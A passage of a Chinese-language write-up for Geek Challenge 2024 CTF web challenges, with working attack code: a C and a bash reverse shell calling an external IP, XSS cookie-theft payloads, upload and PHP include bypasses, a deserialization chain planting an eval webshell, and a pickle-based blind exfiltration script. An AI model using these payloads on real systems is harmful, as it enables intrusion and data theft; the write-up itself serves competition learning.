class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> port = <span class="number">1234</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">revsockaddr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sockt = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    revsockaddr.sin_family = AF_INET;       </span><br><span class="line">    revsockaddr.sin_port = htons(port);</span><br><span class="line">    revsockaddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;8.155.17.250&quot;</span>);</span><br><span class="line"></span><br><span class="line">    connect(sockt, (<span class="keyword">struct</span> sockaddr *) &amp;revsockaddr, </span><br><span class="line">    <span class="keyword">sizeof</span>(revsockaddr));</span><br><span class="line">    dup2(sockt, <span class="number">0</span>);</span><br><span class="line">    dup2(sockt, <span class="number">1</span>);</span><br><span class="line">    dup2(sockt, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> * <span class="type">const</span> argv[] = &#123;<span class="string">&quot;bash&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execvp(<span class="string">&quot;bash&quot;</span>, argv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gcc exp.c -o exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure><p>拿到flag<br><img src="/img/WP/geek2024/root%E6%8F%90%E6%9D%83.png" alt=""></p><h2 id="Can-you-Pass-Me">Can_you_Pass_Me</h2><p>我又来推销fenjing了:<a href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a><br>fenjing分析确实有ssti漏洞，但是好像不能直接出的样子<br>那就反弹shell</p><pre><code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/8.155.17.250/1234 0&gt;&amp;1&quot;</code></pre><p><img src="/img/WP/geek2024/fenjing.png" alt=""><br><img src="/img/WP/geek2024/ssti.png" alt=""></p><h2 id="Problem-On-My-Web">Problem_On_My_Web</h2><p>一看是经典留言榜，试一试XSS漏洞</p><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p><img src="/img/WP/geek2024/xss.png" alt=""><br>确实有漏洞，但是document.cookie不能直接读<br>根据manager路由的提示，考虑通过manager路由带出cookie<br>先写个</p><pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre><p>到留言榜，然后在/manager传参url=<a href="http://127.0.0.1/">http://127.0.0.1/</a> 带出flag<br><img src="/img/WP/geek2024/xss_2.png" alt=""></p><h2 id="ez-http">ez_http</h2><p>burp传参如下：<br><img src="/img/WP/geek2024/http1.png" alt=""><br><a href="https://jwt.io/">https://jwt.io/</a> 在这上面把hasFlag的false改为true，key为Starven_secret_key<br><img src="/img/WP/geek2024/http2.png" alt=""><br>cookie传参改过的jwt回去拿到flag<br><img src="/img/WP/geek2024/http3.png" alt=""></p><h2 id="baby-upload">baby_upload</h2><p>能传.htaccess进去？</p><pre><code>AddType application/x-httpd-php .jpg</code></pre><p><img src="/img/WP/geek2024/upload1.png" alt=""><br>不能传.htaccess，但还有个文件叫.user.ini</p><pre><code>auto_prepend_file=a.jpg</code></pre><p>把a.jpg写上我们的webshell就行了。<br>这也不行？？？<br>结果发现a.jpg.php没被过滤。。。<br>（并不）轻松RCE，flag也不用提权读取<br><img src="/img/WP/geek2024/upload2.png" alt=""></p><h2 id="ez-include">ez_include</h2><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;starven_secret.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/starven_secret.php/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;还想非预期?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看我的PHP特性集合哦(<a href="https://blog.hatchet.top/posts/44659fec">https://blog.hatchet.top/posts/44659fec</a>)<br>轮流循环绕过</p><pre><code>?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php?file=php://filter/convert.base64-encode/resource=/nice/../../proc/self/cwd/starven_secret.php</code></pre><p>给了/levelllll2.php<br>levelllll2.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span> [<span class="string">&quot;syc&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span> [<span class="string">&quot;syc&quot;</span>];</span><br><span class="line">    <span class="variable">$hint</span> = <span class="string">&quot;register_argc_argv = On&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/config|create|filter|download|phar|log|sess|-c|-d|%|data/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hint都给的这么明显了还不会做?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], -<span class="number">4</span>) === <span class="string">&#x27;.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a><br>博客中的 pearcmd.php的巧妙利用 可以用于解决这题。<br>仿照博客的poc构造出payload<br><img src="/img/WP/geek2024/include1.png" alt=""><br><img src="/img/WP/geek2024/include2.png" alt=""></p><h2 id="PHP不比Java差">PHP不比Java差</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;secret.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Sink</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;!!!A GREAT STEP!!!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Is there any file?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$FLAG</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Geek</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$change</span>=<span class="variable">$_GET</span>[<span class="string">&quot;change&quot;</span>];</span><br><span class="line">        <span class="variable">$FUNC</span>=<span class="variable">$change</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$FUNC</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Syclover</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Where</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$IS</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Girlfriend</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString is called&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$eee</span>=<span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Where</span>(<span class="variable">$this</span>-&gt;IS);</span><br><span class="line">        <span class="variable">$fff</span>=<span class="variable language_">$this</span>-&gt;Starven;</span><br><span class="line">        <span class="variable">$eee</span>-&gt;<span class="variable">$fff</span>(<span class="variable language_">$this</span>-&gt;Girlfriend);</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]); </span><br></pre></td></tr></table></figure><p>又是php反序列化？<br>反转了，我就喜欢做<br><a href="https://blog.csdn.net/qq_35533398/article/details/108492823">https://blog.csdn.net/qq_35533398/article/details/108492823</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">title</span>(<span class="params"><span class="variable">$title</span>, <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%s. %s\r\n&quot;</span>, <span class="variable">$title</span>, <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$function</span> = <span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&#x27;title&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$function</span>-&gt;<span class="title function_ invoke__">invokeArgs</span>(<span class="keyword">array</span>(<span class="string">&#x27;Dr&#x27;</span>, <span class="string">&#x27;Phil&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里面提到ReflectionFunction里的invokeArgs可以用于执行函数。<br>在本地测试下发现也可以执行系统函数system，且没有被题目过滤。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$function</span> = <span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line">    <span class="variable">$function</span>-&gt;<span class="title function_ invoke__">invoke</span>(<span class="string">&quot;whoami&quot;</span>);</span><br></pre></td></tr></table></figure><p>__unserialize()方法在PHP版本大于7.4才被引入。重点方法在于$change该取什么值。<br>问gpt问出来了reset和array_pop，分别取数组的首和尾。<br>让Sink()被调用，就会引用__toString()方法。然后链子就呼之欲出了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Sink</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;!!!A GREAT STEP!!!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Is there any file?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$FLAG</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Geek</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__unserialize is called&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">#var_dump($data);</span></span><br><span class="line">        <span class="comment">#$change = $_GET[&quot;change&quot;];</span></span><br><span class="line">        <span class="variable">$change</span> = <span class="string">&quot;array_pop&quot;</span>;</span><br><span class="line">        <span class="variable">$FUNC</span> = <span class="variable">$change</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="comment">#var_dump($FUNC);</span></span><br><span class="line">        <span class="variable">$FUNC</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Syclover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Where</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$IS</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Girlfriend</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString is called&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$eee</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Where</span>(<span class="variable">$this</span>-&gt;IS);</span><br><span class="line">        <span class="variable">$fff</span> = <span class="variable language_">$this</span>-&gt;Starven;</span><br><span class="line">        <span class="variable">$eee</span>-&gt;<span class="variable">$fff</span>(<span class="variable language_">$this</span>-&gt;Girlfriend);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$G</span> = <span class="keyword">new</span> <span class="title class_">Geek</span>;</span><br><span class="line"><span class="variable">$S</span> = <span class="keyword">new</span> <span class="title class_">Syclover</span>;</span><br><span class="line"><span class="variable">$C</span> = <span class="keyword">new</span> <span class="title class_">Challenge</span>;</span><br><span class="line"><span class="variable">$G</span>-&gt;a = <span class="variable">$S</span>;</span><br><span class="line"><span class="variable">$G</span>-&gt;b = [<span class="variable">$C</span>,<span class="string">&quot;Sink&quot;</span>];</span><br><span class="line"><span class="variable">$C</span>-&gt;file = <span class="variable">$S</span>;</span><br><span class="line"><span class="variable">$S</span>-&gt;Where = <span class="string">&quot;ReflectionFunction&quot;</span>;</span><br><span class="line"><span class="variable">$S</span>-&gt;IS = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$S</span>-&gt;Starven = <span class="string">&quot;invoke&quot;</span>;</span><br><span class="line"><span class="variable">$S</span>-&gt;Girlfriend = <span class="string">&#x27;echo \&#x27;&lt;?php @eval($_POST[cmd]); ?&gt;\&#x27; &gt; shell.php&#x27;</span>;</span><br><span class="line"><span class="variable">$payload</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$G</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br></pre></td></tr></table></figure><p>连上后发现还要SUID提权</p><pre><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></pre><p><img src="/img/WP/geek2024/phpjava1.png" alt=""><br>这次扫出了file<br>直接file -f /flag<br><img src="/img/WP/geek2024/phpjava2.png" alt=""><br>P. S:<br>做完后发现change取implode能直接叫出toString<br>链子直接变成一段<br>甚至能不用Challenge类的吗，惊了。</p><h2 id="SecretInDrivingSchool">SecretInDrivingSchool</h2><p>审计HTTP发现有注释<br>L000G1n.php<br>登录还有提示，出题人好温油<br>账号为4-16位数字或者英文字母<br>密码格式为三位字母+@chengxing<br>用admin: SYC@chengxing 登录成功，转到adChange.php<br><img src="/img/WP/geek2024/ad.png" alt=""><br>考虑。。注一下？<br>在广告代码最后写</p><pre><code>&lt;?= `cat /flag` ?&gt;</code></pre><p>然后就能在首页看到flag啦~<br><img src="/img/WP/geek2024/showad.png" alt=""></p><h2 id="rce-me">rce_me</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Can you RCE me?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/start.*now/is&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>], <span class="string">&quot;start now&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Well, you haven&#x27;t started.&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Welcome to GeekChallenge2024!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    <span class="title function_ invoke__">sha1</span>((<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span>) &amp;&amp;</span><br><span class="line">    (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>] != <span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]))</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You took the first step!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$year</span>) &lt; <span class="number">2024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$year</span> + <span class="number">1</span>) &gt; <span class="number">2025</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Well, I know the year is 2024&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.+?rce/ism&quot;</span>, <span class="variable">$purpose</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$purpose</span>, <span class="string">&quot;rce&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Get the flag now!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;It is not enough to stop you!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;It is so easy, do you know sha1 and md5?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Well, you haven<span class="string">&#x27;t started.</span></span><br></pre></td></tr></table></figure><p>特性都很一般般，不详细讲了<br>大小写绕过，php7转化参数错误<br>我收藏的哈希函数绕过：<a href="https://blog.hatchet.top/posts/66a71aff">https://blog.hatchet.top/posts/66a71aff</a><br>对转换参数有疑问可以搭个php 自己 echo $_GET;<br>甚至还用了去年的题目。。。<br><img src="/img/WP/geek2024/ez_php.png" alt=""></p><h2 id="ez-python">ez_python</h2><p>这题我在moectf2024写的pet_store的payload竟然能直接用上。。。<br>出题人过滤了bash不能反弹shell，又无回显怎么办？<br>我用的时间盲注</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符集 [A-Za-z0-9&#123;&#125;-_]</span></span><br><span class="line">alphabet = string.ascii_letters + string.digits + <span class="string">&quot;&#123;&#125;-_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 URL</span></span><br><span class="line">target_url = <span class="string">&quot;http://5000-97f7a701-0ac8-4d83-a520-41a98ed6f1bd.challenge.ctfplus.cn/login&quot;</span>  <span class="comment"># 替换为目标 URL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜测 $FLAG 的最大长度</span></span><br><span class="line">max_flag_length = <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">prefix</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    根据当前猜测的前缀生成 payload。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    payload_code = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">import os;import time;</span></span><br><span class="line"><span class="string">result=os.popen(&#x27;cat /flag&#x27;).read();</span></span><br><span class="line"><span class="string">if result.startswith(&quot;<span class="subst">&#123;prefix&#125;</span>&quot;):</span></span><br><span class="line"><span class="string">    time.sleep(1)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    time.sleep(0.1)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Pet</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">exec</span>, (payload_code,))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用 pickle 序列化并编码为 base64</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(pickle.dumps(Pet())).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    发送 payload 并测量响应时间。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cookies = &#123;</span><br><span class="line">        <span class="string">&quot;heart&quot;</span>: <span class="string">&quot;a4a4c3ff70994e5ab8b7222ab9ab30289ff438e3557d8bf54357d20195459fd6&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;statement&quot;</span>: payload&#125;</span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="comment"># 发送请求（假设是 POST 请求）</span></span><br><span class="line">    response = requests.post(target_url, data=data, cookies=cookies)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    end_time = time.time()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> end_time - start_time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_flag</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    猜测 $FLAG 的值。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    guessed_flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_flag_length):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> alphabet:</span><br><span class="line">            current_guess = guessed_flag + char</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Testing: <span class="subst">&#123;current_guess&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 生成 payload</span></span><br><span class="line">            payload = generate_payload(current_guess)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            <span class="comment"># 测量响应时间</span></span><br><span class="line">            response_time = send_payload(payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> response_time &gt; <span class="number">0.8</span>:</span><br><span class="line">                <span class="comment"># 如果响应时间大于阈值，则表示猜测正确</span></span><br><span class="line">                guessed_flag += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found character: <span class="subst">&#123;char&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 如果遍历完整个字母表都没有找到字符，说明 FLAG 猜测完毕</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;FLAG guessed: <span class="subst">&#123;guessed_flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> guessed_flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = guess_flag()</span><br><span class="line">    <span class="built_in">print</span>(<span 